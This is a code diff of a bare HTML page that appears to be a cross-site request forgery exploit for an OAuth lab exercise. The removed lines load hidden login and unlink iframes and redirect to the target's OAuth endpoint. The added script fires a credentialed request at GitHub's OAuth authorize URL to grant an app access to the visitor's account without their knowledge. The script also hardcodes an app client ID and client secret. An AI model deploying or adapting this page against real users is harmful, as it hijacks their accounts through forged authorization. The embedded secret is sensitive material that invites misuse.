@@ -2,18 +2,34 @@
 <html>
 <head>
 <title>Page Title</title>
-<script>
-function sleep(ms) {
-  return new Promise(resolve => setTimeout(resolve, ms));
-}
-</script>
 </head>
 <body>
 
-<iframe src="http://gnogr.github.io/login_frame.html"></iframe>
-<iframe src="http://gnogr.github.io/unlink_frame.html"></iframe>
 <script>
-	setTimeout(function() {window.location="http://ptl-50f91015-7087047a.libcurl.so/users/auth/myprovider"}, 2000);
+	
+const CLIENT_ID = '2edb39b862701051c7ee';
+const CLIENT_SECRET = 'fa25dc8183285fcbb56847e541ebd4d1db280153';
+
+const startButton = document.getElementById('start-button');
+const resultBox = document.getElementById('result-box');
+const url = new URL(window.location);
+  // This is the initial pageload
+const authUrl = `https://github.com/login/oauth/authorize?client_id=${CLIENT_ID}&scope=read:user&authorize=1`;
+fetch(
+  authUrl,
+  {
+    method: 'HEAD',
+    credentials: 'include',
+    mode: 'no-cors'
+  }
+).catch(err => {
+  throw err;
+}).then(() => {
+  // We can't read the auth code on the redirect due to the same-origin policy.
+  // However, it shouldn't matter because the app is now authorized and will redirect automatically the next time.
+  window.location = authUrl;
+});
+
 </script>
 
 </body>
